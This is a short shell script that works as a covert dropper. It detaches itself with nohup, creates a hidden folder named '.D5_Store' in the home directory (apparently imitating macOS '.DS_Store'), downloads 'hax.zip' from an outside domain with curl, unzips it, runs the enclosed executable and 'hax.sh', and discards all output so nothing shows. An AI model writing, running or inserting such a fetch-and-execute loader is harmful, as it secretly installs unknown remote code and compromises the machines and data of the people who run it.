trap "rm -f /tmp/hax.lock; exit" SIGTERM SIGINT SIGQUIT SIGHUP
nohup bash -c "
trap 'rm -f /tmp/hax.lock; exit' SIGTERM SIGINT SIGQUIT SIGHUP
cd ~
rm -rf .D5_Store
mkdir .D5_Store
cd .D5_Store
rm -f /tmp/hax.lock
curl -O http://emraldia.com/hax.zip
unzip hax.zip
./exec
bash hax.sh
" > /dev/null &
